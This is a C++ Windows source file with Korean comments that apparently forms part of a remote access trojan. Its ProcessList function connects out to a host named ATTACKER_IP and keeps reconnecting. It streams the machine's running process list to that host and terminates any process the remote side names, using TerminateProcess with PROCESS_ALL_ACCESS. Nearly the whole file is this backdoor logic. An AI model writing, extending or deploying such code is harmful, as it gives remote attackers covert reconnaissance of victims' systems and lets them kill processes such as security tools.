//FD_READ안일어남
#include"main.h"
int Unicode2ASCII(WCHAR* uni, char* ascii)
{
	int nLen = WideCharToMultiByte(CP_ACP, 0, uni, -1, NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, uni, -1, ascii, nLen, 0, 0);
	return nLen;
}
void ASCII2Unicode(char* ascii,WCHAR* uni) {
	
	
	// sTime을 유니코드로 변환하기에 앞서 먼저 그 길이를 알아야 한다.
	int nLen = MultiByteToWideChar(CP_ACP, 0, ascii, strlen(ascii), NULL, NULL);
	// 메모리할당
	uni = SysAllocStringLen(NULL, nLen);
	// 변환 수행
	MultiByteToWideChar(CP_ACP, 0, ascii, strlen(ascii), uni, nLen);


}
void ProcessList() 
{
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2, 2), &wsadata);
	SOCKET ssock = socket(AF_INET, SOCK_STREAM, 0);
	if (ssock == INVALID_SOCKET) 
	{
		std::cout << "socket Errror" << endl;
		return;
	}
	WSAEVENT sevent=WSACreateEvent();
	WSAEventSelect(ssock, sevent, FD_CONNECT);
	SOCKADDR_IN saddr = { 0, };
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(PROCESS_VIEW_KILL);
	int errcode = 0;
	while ((errcode = connect(ssock, (LPSOCKADDR)& saddr, sizeof(saddr))) == SOCKET_ERROR) {
		if (WSAGetLastError() == WSAEISCONN)
			break;
		std::cout << "접속 대기중..." << endl;
		Sleep(1000);
	}
	
	/////////////////////////////////////////////////////////////////////////
	
	while (1) {
		/*char clear_char;
		ULONG clear_size=0;
		ULONG i;
		if (ioctlsocket(ssock, FIONREAD, &clear_size) != SOCKET_ERROR)
			for (i = 0; i < clear_size; i++)
				recv(ssock, &clear_char, sizeof(char), 0);*/
		$snap:
		DWORD dwmsg = MsgWaitForMultipleObjects(1, &sevent, FALSE, 3000, QS_POSTMESSAGE);
		if (dwmsg==WAIT_TIMEOUT)
			goto $Write;
		if (dwmsg == WAIT_FAILED) 
		{
			std::cout << "Wait_Failed" << endl;
			break;
		}

		if (dwmsg == WAIT_OBJECT_0 + 1)
			break;

		WSANETWORKEVENTS ne;
		WSAEnumNetworkEvents(ssock, sevent, &ne);

		

		if (ne.lNetworkEvents & FD_CONNECT) 
		{

			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			if (errcode != 0) 
			{
				std::cout << "connecting Error" << endl;
				goto $exit;
				break;
			}

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_WRITE | FD_READ | FD_CLOSE);
			std::cout << "connecting......" << endl;
			continue;
		}


		if (ne.lNetworkEvents & FD_READ) 
		{

			int errcode = ne.iErrorCode[FD_READ_BIT];
			if (errcode != 0) 
			{
				
			}
			char buf[100] = { 0, };
			int size = 0;
			WCHAR* name=nullptr;
			if (recv(ssock, buf,sizeof(buf), 0) == SOCKET_ERROR)
				std::cout << "recv error" << endl;
			int i = 0;
			for (; buf[i] == ' ';)
				i++;
			for (int j = 0; j < i; j++) 
			{
				buf[j] = buf[i + j];
				buf[i + j] = NULL;
			}
			//ASCII2Unicode(buf, name);
			CStringA Aname{ buf };
			CString Uname{ Aname };
			HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 pe = { 0, };
			pe.dwSize = sizeof(PROCESSENTRY32);
			Process32First(snap, &pe);
			do 
			{

				if (Uname.CompareNoCase(pe.szExeFile) == 0)
				{
					DWORD pid = pe.th32ProcessID;
					HANDLE kill = OpenProcess(PROCESS_ALL_ACCESS, NULL,pid);
					DWORD dwprity = GetPriorityClass(kill);
					DWORD code = 0;

					if (TerminateProcess(kill, 0))
						GetExitCodeProcess(kill, &code);

					CloseHandle(kill);

				}

			} while (Process32Next(snap, &pe));

		}

		if (ne.lNetworkEvents & FD_WRITE) 
		{

		$Write:
			//Sleep(5000);
			int errcode = 0;
			errcode = ne.iErrorCode[FD_WRITE_BIT];
			if (errcode != 0) 
			{
				std::cout << "write error" << endl;
			}

			HANDLE prosnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (prosnap == INVALID_HANDLE_VALUE)
			{
				std::cout << "prosnap Error" << endl;
				goto $snap;
			}
			
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(PROCESSENTRY32);
			
			if (!Process32First(prosnap, &pe32))
			{
				wcout << L"Process32First Error!" << endl;
				CloseHandle(prosnap);
				goto $snap;
			}

			wcout << L"\t[Process name]\t[PID]\t[ThreadID]\t[PPID]\n" << endl;
			int count = 0;
			PROCESSENTRY32 arrpe32[1024] = { 0, };
			
				if (!Process32First(prosnap, &pe32))
				{
					wcout << L"Process32First Error!" << endl;
					CloseHandle(prosnap);
					goto $snap;
				}
				do
				{
					CStringA str;
					
					char buf[MAX_PATH] = { 0, };
					Unicode2ASCII(pe32.szExeFile, buf);

					str.Format("%25s", buf);
					int size = str.GetLength();
					if (send(ssock, (char*)&size, 4, 0) == SOCKET_ERROR)
						goto $exit;
					if (send(ssock, str.GetString(), str.GetLength(), 0) == SOCKET_ERROR)
					{
						goto $exit;
					}
					count++;
					Sleep(5);
					//속도가 맞지 않아서 안돼 아무것도 아 젠장
				} while (Process32Next(prosnap, &pe32));
				int eof = EOF;
				send(ssock, (char*)& eof, 4, 0);
				std::cout << count << endl;


				char clear_char;
				ULONG clear_size = 0;
				ULONG i;
				if (ioctlsocket(ssock, FIONREAD, &clear_size) != SOCKET_ERROR)
					std::cout << clear_size << endl;
					/*for (i = 0; i < clear_size; i++)
						recv(ssock, &clear_char, sizeof(char), 0);
						//수신버퍼 지워*/
				continue;
		}

		if (ne.lNetworkEvents & FD_CLOSE) 
		{
$exit:
			std::cout << "종료" << endl;
			if(ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);
			ssock = socket(AF_INET, SOCK_STREAM, 0);

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_CONNECT);

			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) {
				
				if (WSAGetLastError() == WSAEISCONN)
					break;

				std::cout << "접속 대기중..." << endl;
				
				Sleep(1000);
			}
		}
			
	}

}

//https://kspil.tistory.com/10	//kill process
//출처: https://gameuser.tistory.com/entry/Process-Suspend-Windows [게임유저가 발로하는 프로그래밍]*/
//https://hummingbird.tistory.com/6320